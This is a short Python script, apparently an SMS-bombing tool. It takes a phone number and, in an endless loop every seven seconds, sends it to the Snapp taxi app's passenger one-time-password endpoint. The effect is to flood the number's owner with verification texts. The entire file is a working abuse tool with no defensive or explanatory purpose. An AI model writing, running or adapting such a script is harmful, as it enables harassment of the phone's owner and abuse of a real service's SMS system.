import requests
import time

Enter = input("enter number:")

while True:
    Url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    Number = {"cellphone":"+98"+Enter}
    sms = requests.post(Url,data=Number)
    print(sms.status_code)
    time.sleep(7)
    
